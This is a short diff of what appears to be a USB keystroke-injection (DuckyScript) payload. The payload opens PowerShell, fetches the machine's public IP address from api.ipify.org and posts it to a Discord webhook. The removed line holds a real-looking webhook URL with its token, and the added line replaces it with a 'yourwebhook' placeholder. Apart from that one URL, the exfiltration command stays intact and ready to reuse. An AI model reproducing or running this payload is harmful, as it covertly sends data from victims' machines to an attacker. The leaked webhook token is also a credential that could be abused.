@@ -6,5 +6,5 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 1000
-STRING $ip = (Invoke-RestMethod -Uri "http://api.ipify.org"); curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=La dirección IP es: $ip" https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL
+STRING $ip = (Invoke-RestMethod -Uri "http://api.ipify.org"); curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=La dirección IP es: $ip" https://yourwebhook
 ENTER
